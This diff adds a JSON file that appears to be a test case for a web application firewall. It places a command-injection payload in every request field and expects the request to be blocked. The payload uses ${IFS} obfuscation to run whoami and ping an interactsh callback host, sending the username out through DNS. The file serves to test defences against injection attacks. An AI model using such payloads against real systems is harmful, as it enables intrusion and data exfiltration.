@@ -1,0 +1,14 @@
+{
+  "req": [
+    {
+      "URL": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "ARGS": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "BODY": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "COOKIE": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "USER-AGENT": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "REFERER": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "HEADER": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+      "BLOCKED": true
+    }
+  ]
+}
